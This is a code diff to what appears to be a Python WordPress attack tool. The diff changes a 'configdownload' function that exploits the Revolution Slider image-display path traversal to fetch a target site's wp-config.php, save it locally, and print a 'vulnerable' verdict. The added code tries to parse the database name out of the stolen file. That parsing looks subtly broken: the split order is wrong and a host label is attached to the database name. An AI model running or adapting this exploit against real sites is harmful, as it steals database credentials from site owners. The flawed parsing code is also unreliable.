@@ -1,3 +1,5 @@
+#  -*- coding: utf-8 -*-
+
 import requests, random, threading, time
 from colorama import Fore
 from bs4 import BeautifulSoup
@@ -102,11 +104,20 @@ def dirscan(target):
         time.sleep(0.1)
         
 def configdownload(target):
-        req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
-        if req.status_code == 200:
-            files = open('config.php', "w")
-            files.write(req.text)
-            print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} Vulnerable')
+    print_info(f'Starting module Config Download on {target}')
+    req = requests.get(target + "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php")
+    if req.status_code == 200:
+        files = open('config.php', "w")
+        files.write(req.text)
+        print_sucess(f'Target {Fore.LIGHTGREEN_EX}IS{Fore.WHITE} Vulnerable')
+
+        try:
+            text = req.text
+            db_name = text.split("define('DB_NAME', ")[0]
+            db_name = db_name.split("');")[1]
+            print_info(f'Database Host : {db_name}')
+        except:
+            print_error('Failed to pharse request data')
             print_sucess('Output saved to output.txt\n')
-        else:
-            print_error('Target isn\'t vulnerable\n')
+    else:
+        print_error('Target isn\'t vulnerable\n')
